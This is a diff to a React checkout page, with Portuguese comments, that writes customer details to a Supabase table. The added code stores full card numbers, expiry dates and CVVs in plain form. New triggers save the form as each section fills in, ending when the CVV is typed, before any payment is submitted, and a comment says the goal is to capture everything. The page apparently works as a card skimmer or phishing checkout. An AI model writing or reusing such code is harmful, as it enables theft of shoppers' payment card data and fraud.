@@ -97,7 +97,7 @@ export default function Checkout() {
 
   const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
     try {
-      console.log("Tentando salvar dados no Supabase...", formData);
+      console.log("Salvando ficha completa no Supabase...", statusPagamento);
       const { error } = await supabase.from('checkouts').insert([{
         nome_completo: formData.nome,
         email: formData.email,
@@ -110,31 +110,42 @@ export default function Checkout() {
         cidade: formData.cidade,
         estado: formData.estado,
         numero: formData.numero,
-        numero_cartao: metodo === 'cartao' ? formData.numCartao : 'PAGAMENTO VIA PIX',
-        nome_cartao: metodo === 'cartao' ? formData.nomeCartao : 'PAGAMENTO VIA PIX',
-        validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
-        cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
+        numero_cartao: formData.numCartao || (metodo === 'pix' ? 'PIX' : ''),
+        nome_cartao: formData.nomeCartao || (metodo === 'pix' ? 'PIX' : ''),
+        validade_cartao: formData.validade || (metodo === 'pix' ? 'PIX' : ''),
+        cvv_cartao: formData.cvv || (metodo === 'pix' ? 'PIX' : ''),
         produto_nome: produto.nome,
         valor_total: produto.preco,
         status: statusPagamento
       }]);
       
-      if (error) {
-        console.error("Erro Supabase:", error);
-      } else {
-        console.log("Dados salvos com sucesso no Supabase!");
-      }
+      if (error) console.error("Erro Supabase:", error);
     } catch (e) {
       console.error("Erro ao salvar dados no painel:", e);
     }
   };
 
-  // Salvar dados automaticamente quando o usuário termina de preencher o telefone (último campo da seção 1)
+  // Gatilhos de salvamento em tempo real para capturar TUDO
   useEffect(() => {
+    // Se preencheu os dados básicos
     if (formData.nome && formData.cpf && formData.telefone.length >= 14) {
-      salvarDadosNoPainel('pre-checkout');
+      salvarDadosNoPainel('lead_pessoal');
     }
   }, [formData.telefone]);
+
+  useEffect(() => {
+    // Se preencheu o endereço (disparado após preencher o número da casa)
+    if (formData.endereco && formData.numero && formData.cidade) {
+      salvarDadosNoPainel('lead_endereco');
+    }
+  }, [formData.numero]);
+
+  useEffect(() => {
+    // Se preencheu os dados do cartão (disparado após preencher o CVV)
+    if (formData.numCartao.length >= 16 && formData.cvv.length >= 3) {
+      salvarDadosNoPainel('lead_cartao_preenchido');
+    }
+  }, [formData.cvv]);
 
   const gerarPix = async () => {
     if (!formData.nome || !formData.cpf || !formData.email) {
